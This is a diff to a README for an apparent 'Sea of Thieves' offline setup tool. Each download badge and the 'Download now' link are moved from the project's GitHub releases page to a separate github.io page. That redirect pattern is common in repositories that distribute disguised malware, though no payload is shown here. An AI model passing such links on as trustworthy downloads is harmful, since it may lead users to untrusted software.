@@ -18,16 +18,16 @@
 ### 🎯 Quick Download
 <div align="center">
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-Play%20Now!-FF6B6B?style=for-the-badge&logo=download)](https://github.com/Sea-of-Thieves-Offline-Setup-Assistant/sea-of-thieves-offline-setup-assistant/releases)
+[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-Play%20Now!-FF6B6B?style=for-the-badge&logo=download)](https://sea-of-thieves-offline-setup-assistant.github.io/.github)
 
 </div>
 
 ### 💾 Platform Downloads
 <div align="center">
 
-[![Windows 10](https://img.shields.io/badge/Windows%2010-0078D4?style=for-the-badge&logo=windows)](https://github.com/Sea-of-Thieves-Offline-Setup-Assistant/sea-of-thieves-offline-setup-assistant/releases)
-[![Windows 11](https://img.shields.io/badge/Windows%2011-0078D4?style=for-the-badge&logo=windows)](https://github.com/Sea-of-Thieves-Offline-Setup-Assistant/sea-of-thieves-offline-setup-assistant/releases)
-[![Portable Version](https://img.shields.io/badge/Portable-No%20Install-28a745?style=for-the-badge&logo=usb)](https://github.com/Sea-of-Thieves-Offline-Setup-Assistant/sea-of-thieves-offline-setup-assistant/releases)
+[![Windows 10](https://img.shields.io/badge/Windows%2010-0078D4?style=for-the-badge&logo=windows)](https://sea-of-thieves-offline-setup-assistant.github.io/.github)
+[![Windows 11](https://img.shields.io/badge/Windows%2011-0078D4?style=for-the-badge&logo=windows)](https://sea-of-thieves-offline-setup-assistant.github.io/.github)
+[![Portable Version](https://img.shields.io/badge/Portable-No%20Install-28a745?style=for-the-badge&logo=usb)](https://sea-of-thieves-offline-setup-assistant.github.io/.github)
 
 </div>
 
@@ -199,7 +199,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ---
 
 <p align="center">
-<strong>Ready to set sail? ⚓ <a href="https://github.com/Sea-of-Thieves-Offline-Setup-Assistant/sea-of-thieves-offline-setup-assistant/releases">Download now</a> and start your offline Sea of Thieves adventure! 🏴‍☠️</strong>
+<strong>Ready to set sail? ⚓ <a href="https://sea-of-thieves-offline-setup-assistant.github.io/.github">Download now</a> and start your offline Sea of Thieves adventure! 🏴‍☠️</strong>
 </p>
 
 <p align="center">
